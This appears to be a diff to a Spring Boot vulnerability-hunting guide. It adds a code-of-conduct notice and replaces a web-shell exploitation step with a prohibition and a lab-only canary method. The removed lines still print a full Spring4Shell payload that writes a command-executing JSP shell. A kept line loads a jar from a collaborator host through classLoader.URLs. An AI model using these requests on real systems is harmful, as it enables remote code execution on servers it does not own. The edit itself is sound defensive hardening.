@@ -6,6 +6,8 @@ metadata:
   report_count: 16
 ---
 
+> **Mandatory testing conduct:** Before taking any action, read and follow [`../../CODE_OF_CONDUCT.md`](../../CODE_OF_CONDUCT.md). It overrides any conflicting payload, proof, persistence, exploitation, availability, or data-handling instruction in this skill.
+
 # HUNT-SPRINGBOOT — Spring Boot Specific Vulnerabilities
 
 ## Crown Jewel Targets
@@ -187,9 +189,9 @@ curl -s "https://$TARGET/api/user" \
   -d "class.module.classLoader.URLs[0]=jar:http://COLLAB_HOST/test.jar!/"
 # Check COLLAB for HTTP callback
 
-# Exploitation: write webshell via class loader
-curl -s "https://$TARGET/login" \
-  --data-raw "username=test&password=test&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B+java.io.InputStream+in+%3D+Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B+int+a+%3D+-1%3B+byte%5B%5D+b+%3D+new+byte%5B2048%5D%3B+while((a%3Din.read(b))!%3D-1)%7B+out.println(new+String(b))%3B+%7D+%7D+%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+# Prohibited validation: do not write or upload a web shell.
+# Use version/deployment preconditions, safe parameter-binding evidence, and an approved inert
+# canary in an isolated owner-controlled lab. Record the web-shell path as unexecuted impact.
 ```
 
 ---
